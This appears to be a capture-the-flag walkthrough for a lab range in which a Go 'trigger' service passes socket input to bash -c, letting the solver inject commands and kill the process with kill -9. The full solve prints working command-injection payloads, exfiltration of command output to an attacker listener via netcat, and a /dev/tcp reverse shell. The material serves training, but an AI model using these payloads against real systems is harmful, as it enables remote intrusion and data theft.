# Fiery Gambit — Walkthrough

Try the range cold first. Hints go from gentle to full. `LHOST` = your attacking box,
`TARGET` = the device, `9803` = its port.

---

## Progressive hints

<details><summary>Hint 1 — where's the bug?</summary>

Read `detonateBomb()` in `trigger.go`. Your input (the "detonation code" read off the
socket) is placed into a command **string** and handed to `bash -c`. It is never quoted
or sanitized.
</details>

<details><summary>Hint 2 — what does that let you do?</summary>

If whatever you send becomes part of `bash -c "./safety.sh <your input>"`, then a shell
metacharacter ends the `safety.sh` call and starts *your own* command. That's classic
**command injection** → arbitrary code execution on the device.
</details>

<details><summary>Hint 3 — you won't see your output</summary>

The injected command's output goes to the program's own logs, **not** back over your
netcat session. So either (a) run a command that needs no output (a direct kill), or
(b) send output to a listener you control.
</details>

<details><summary>Hint 4 — how do you disarm safely?</summary>

"Disarm … using the kill command to stop the trigger process." But check for *unknown
modifications* first: if the device catches SIGTERM/SIGINT it detonates on a normal
`kill` or Ctrl-C, and if `hairTrigger` is on it detonates when your session drops.
The stop that no handler can catch is **`kill -9`** (SIGKILL).
</details>

---

## Full solve

### 1. Recon
```bash
nmap -sV -p- TARGET          # find the open port (9803 by default)
```

### 2. Prove code execution (optional sanity check)
Injected output doesn't return over your session, so exfil it to a listener:
```bash
# terminal A — your listener
nc -lvnp 4444
# terminal B — inject a command that phones home
printf 'X; id | nc -w2 LHOST 4444' | nc -w3 TARGET 9803
```
You'll see `uid=…` land on your listener. That's RCE.

### 3. Find the trigger process
```bash
printf 'X; pgrep -x wmd-trigger | nc -w2 LHOST 4444' | nc -w3 TARGET 9803
```

### 4. Deny the trigger / disarm — pick one

**A. Blind one-shot (cleanest).** No PID lookup, no output needed, beats every trap:
```bash
printf 'X; pkill -9 -x wmd-trigger' | nc -w3 TARGET 9803
```
SIGKILL can't be caught, so the signal trap never fires; you kill the process rather
than dropping the session, so hairTrigger never fires either. Done.

**B. Targeted kill** (if you grabbed the PID in step 3):
```bash
printf 'X; kill -9 <PID>' | nc -w3 TARGET 9803
```

**C. Full foothold** (when you want to look around first):
```bash
# listener up (nc -lvnp 4444), then:
printf 'X; bash -i >& /dev/tcp/LHOST/4444 0>&1' | nc -w3 TARGET 9803
# in the shell that lands:
ps aux | grep wmd-trigger
kill -9 <PID>          # NOT plain kill — SIGTERM may detonate
```

### 5. Confirm disarmed
The device no longer serves its port, and no `DETONATED` marker exists:
```bash
nc -vz TARGET 9803           # should now refuse the connection
cat runs/<id>/.config        # bare metal: what traps were really on
ls  runs/<id>/DETONATED      # should be "No such file"
# docker: docker exec fg-<id> cat /opt/trigger/.config
```
> Confirm a kill by the **port going dead** (or `ps` showing the process gone), not by
> `pgrep` alone — on some minimal setups a just-killed process lingers briefly as a
> `<defunct>` zombie until init reaps it. Zombie = already dead.

---

## Why the naive moves fail (run these to feel it)

| You do | If `catchSignals` on | If `hairTrigger` on |
|--------|----------------------|---------------------|
| `kill <pid>` (SIGTERM) | **detonates** | — |
| Ctrl-C the process (SIGINT) | **detonates** | — |
| connect, then just disconnect | — | **detonates** |
| `kill -9 <pid>` (SIGKILL) | safe | safe |

The whole exercise rewards reading the source and using `kill -9` — the one stop nothing
can intercept.

## Speed targets
- Warmup clean solve: **under 3 min**
- Random config (recon + identify traps + disarm): **under 8 min**
- Three-device range, all disarmed: **under 20 min**
